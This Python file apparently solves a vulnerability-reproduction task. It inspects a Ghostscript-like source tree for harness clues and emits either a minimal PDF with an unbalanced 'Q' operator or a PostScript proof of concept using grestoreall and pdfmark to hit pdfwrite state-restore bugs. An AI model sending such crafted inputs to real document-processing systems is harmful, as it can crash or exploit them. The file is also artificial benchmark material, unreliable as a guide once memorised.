import os
import io
import re
import tarfile
from typing import Iterator, Optional, Tuple


def _iter_source_texts(src_path: str, max_file_size: int = 2_000_000) -> Iterator[Tuple[str, str]]:
    def should_consider(name: str) -> bool:
        low = name.lower()
        if any(part in low for part in ("/.git/", "\\.git\\", "/out/", "\\out\\", "/build/", "\\build\\")):
            return False
        exts = (".c", ".cc", ".cpp", ".h", ".hpp", ".m", ".mm", ".inc", ".txt", ".md", ".mk", ".cmake", ".in", ".am")
        if low.endswith(exts):
            return True
        if any(k in low for k in ("fuzz", "oss-fuzz", "fuzzer", "harness")):
            return True
        return False

    if os.path.isdir(src_path):
        for root, _, files in os.walk(src_path):
            for fn in files:
                p = os.path.join(root, fn)
                rel = os.path.relpath(p, src_path)
                if not should_consider(rel):
                    continue
                try:
                    st = os.stat(p)
                    if st.st_size > max_file_size:
                        continue
                    with open(p, "rb") as f:
                        b = f.read()
                    try:
                        t = b.decode("utf-8", "ignore")
                    except Exception:
                        t = b.decode("latin1", "ignore")
                    yield rel, t
                except Exception:
                    continue
        return

    if not tarfile.is_tarfile(src_path):
        return

    try:
        with tarfile.open(src_path, "r:*") as tf:
            for m in tf:
                if not m.isreg():
                    continue
                if m.size <= 0 or m.size > max_file_size:
                    continue
                name = m.name
                if not should_consider(name):
                    continue
                try:
                    f = tf.extractfile(m)
                    if f is None:
                        continue
                    b = f.read()
                    try:
                        t = b.decode("utf-8", "ignore")
                    except Exception:
                        t = b.decode("latin1", "ignore")
                    yield name, t
                except Exception:
                    continue
    except Exception:
        return


def _detect_input_mode(src_path: str) -> str:
    """
    Returns:
      'ps'  -> likely gsapi_run_string harness / PostScript execution
      'pdf' -> likely PDF-only harness (pdfi) without gsapi
      'unknown' -> default to ps
    """
    found_gsapi = False
    found_pdfi = False
    found_pdfwrite_arg = False

    for _, t in _iter_source_texts(src_path):
        low = t.lower()
        if "pdfwrite" in low and ("-sdevice=pdfwrite" in low or "sdevice=pdfwrite" in low):
            found_pdfwrite_arg = True

        if "gsapi_" in low or "gsapi run" in low:
            found_gsapi = True

        if "pdfi_" in low or "pdfi " in low or "pdf interpreter" in low:
            found_pdfi = True

        if found_gsapi and (found_pdfwrite_arg or found_pdfi):
            return "ps"

        if found_pdfi and not found_gsapi and found_pdfwrite_arg:
            return "pdf"

        if found_gsapi and found_pdfwrite_arg:
            return "ps"

    if found_pdfi and not found_gsapi:
        return "pdf"
    return "ps"


def _build_minimal_pdf_with_extra_Q() -> bytes:
    content = b"q\nQ\nQ\n"
    objs = []

    def obj(n: int, body: bytes) -> None:
        objs.append((n, body))

    obj(1, b"<< /Type /Catalog /Pages 2 0 R >>")
    obj(2, b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>")
    obj(3, b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Resources <<>> /Contents 4 0 R >>")
    stream = b"<< /Length " + str(len(content)).encode("ascii") + b" >>\nstream\n" + content + b"endstream"
    obj(4, stream)

    out = io.BytesIO()
    out.write(b"%PDF-1.4\n%\xB5\xED\xAE\xFB\n")

    offsets = [0]
    for n, body in objs:
        offsets.append(out.tell())
        out.write(f"{n} 0 obj\n".encode("ascii"))
        out.write(body)
        out.write(b"\nendobj\n")

    xref_pos = out.tell()
    out.write(b"xref\n")
    out.write(b"0 5\n")
    out.write(b"0000000000 65535 f \n")
    for i in range(1, 5):
        off = offsets[i]
        out.write(f"{off:010d} 00000 n \n".encode("ascii"))
    out.write(b"trailer\n")
    out.write(b"<< /Size 5 /Root 1 0 R >>\n")
    out.write(b"startxref\n")
    out.write(str(xref_pos).encode("ascii") + b"\n")
    out.write(b"%%EOF\n")
    return out.getvalue()


def _build_ps_poc() -> bytes:
    # Attempts to exercise pdfwrite viewer state restore paths while remaining valid PostScript.
    ps = (
        b"%!PS\n"
        b"grestoreall\n"
        b"{[/Dest /d0 /View [/XYZ 0 0 0] /DEST pdfmark]} stopped pop\n"
        b"{[/Title (t) /Dest /d0 /OUT pdfmark]} stopped pop\n"
        b"gsave 0 setgray grestoreall\n"
        b"grestoreall\n"
        b"initgraphics\n"
        b"showpage\n"
        b"quit\n"
    )
    return ps


class Solution:
    def solve(self, src_path: str) -> bytes:
        mode = _detect_input_mode(src_path)
        if mode == "pdf":
            return _build_minimal_pdf_with_extra_Q()
        return _build_ps_poc()